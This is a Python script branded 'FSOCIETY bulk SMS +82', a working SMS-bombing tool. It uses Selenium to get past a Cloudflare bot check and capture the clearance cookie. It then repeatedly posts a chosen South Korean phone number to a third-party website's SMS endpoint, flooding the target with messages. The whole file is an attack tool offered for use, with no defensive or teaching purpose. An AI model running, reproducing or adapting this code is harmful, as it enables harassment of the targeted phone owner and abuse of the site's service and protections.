from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import requests
import webbrowser
import os

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r"""
███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
█████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ 
██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  
██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   
╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝               
           
        [0x01] FSOCIETY is bulk SMS +82
        [0x02] Author    : cybermad
        [0x03] Github    : https://github.com/cybermads
        [0x04] Telegram  : t.me/cybermads 
    """)

def bypass():
    options = Options()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--window-size=1920,1080")

    driver = webdriver.Chrome(options=options)
    driver.get("https://10ca-2024.com/")
    time.sleep(10)

    cfb = None
    for c in driver.get_cookies():
        if c['name'] == 'cf_clearance':
            cfb = c['value']
            break

    driver.quit()

    return cfb

def api(cfb, target, count):
    for i in range(1, count + 1):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://10ca-2024.com",
            "Referer": "https://10ca-2024.com/",
            "X-Requested-With": "XMLHttpRequest"
        }

        cookies = {
            "cf_clearance": cfb,
            "Name": "gameodsls",
            "Popup_47": "1",
            "Popup_48": "1",
            "Popup_56": "1",
            "Popup_55": "1",
            "Popup_49": "1"
        }

        data = {
            "m": "100",
            "s": "0",
            "x": "0",
            "ucell": target
        }

        try:
            r = requests.post("https://10ca-2024.com/proc/json/", headers=headers, cookies=cookies, data=data, timeout=5)
            print(f"""
███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
█████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ 
██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  
██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   
╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝            

[0x01] Target  : {target}
[0x02] Count   : {i}
[0x03] Status  : {r.status_code}
[0x04] Headers : {headers}
                """)
            
        except:
            pass

        time.sleep(1)

def API2():
    banner()
    target = input("[+] +82           > ")
    count = int(input("[+] count     > "))
    webbrowser.open("https://discord.gg/nyphor")

    cfb = bypass()
    api(cfb, target, count)
